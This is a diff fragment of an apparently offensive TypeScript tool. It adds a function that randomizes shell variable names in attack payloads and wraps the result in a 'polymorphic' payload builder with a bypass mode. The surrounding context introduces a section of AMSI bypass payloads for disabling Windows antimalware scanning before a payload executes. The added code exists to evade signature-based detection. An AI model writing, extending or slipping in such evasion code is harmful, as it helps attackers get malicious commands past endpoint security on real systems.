@@ -2360,6 +2360,39 @@ export function buildPolymorphicPayload(cmd: string, bypassMode = "quantum"): st
   return parts.join("||");
 }
 
+export function randomizeShellVarNames(payload: string): string {
+  const seen = new Map<string, string>();
+  const SHELL_BUILTINS = new Set([
+    "PATH","HOME","USER","SHELL","PWD","OLDPWD","IFS","PS1","PS2",
+    "UID","EUID","PPID","BASHPID","BASH_VERSION","HOSTNAME","TERM",
+    "LANG","LC_ALL","EDITOR","VISUAL","PAGER","MANPATH","JAVA_HOME",
+    "NX_INIT","CI","GITHUB_ACTIONS","GITLAB_CI","BUILDKITE","CIRCLECI",
+  ]);
+
+  const randIdent = () => {
+    const prefixes = ["_","__","_a","_s","_x","_t","_n","_v","_r","_c"];
+    const p = prefixes[Math.floor(Math.random() * prefixes.length)]!;
+    const n = Math.random().toString(36).slice(2, 7);
+    return `${p}${n}`;
+  };
+
+  return payload.replace(/\b([A-Z_][A-Z_0-9]{2,})\b(?=[^(])/g, (match, name: string) => {
+    if (SHELL_BUILTINS.has(name)) return match;
+    if (!seen.has(name)) seen.set(name, randIdent().toUpperCase());
+    return seen.get(name)!;
+  }).replace(/(?<!\$)\$\{?([A-Z_][A-Z_0-9]{2,})\}?/g, (match, name: string) => {
+    if (SHELL_BUILTINS.has(name)) return match;
+    if (!seen.has(name)) seen.set(name, randIdent().toUpperCase());
+    const mapped = seen.get(name)!;
+    return match.replace(name, mapped);
+  });
+}
+
+export function buildPolymorphicVarPayload(payload: string, bypassMode = "quantum"): string {
+  const varRotated = randomizeShellVarNames(payload);
+  return buildPolymorphicPayload(varRotated, bypassMode);
+}
+
 /* ═══════════════════════════════════════════════════════════════════════════
    AMSI BYPASS PAYLOADS  (Windows / PowerShell)
    Techniques that disable or patch AMSI before the real payload executes.
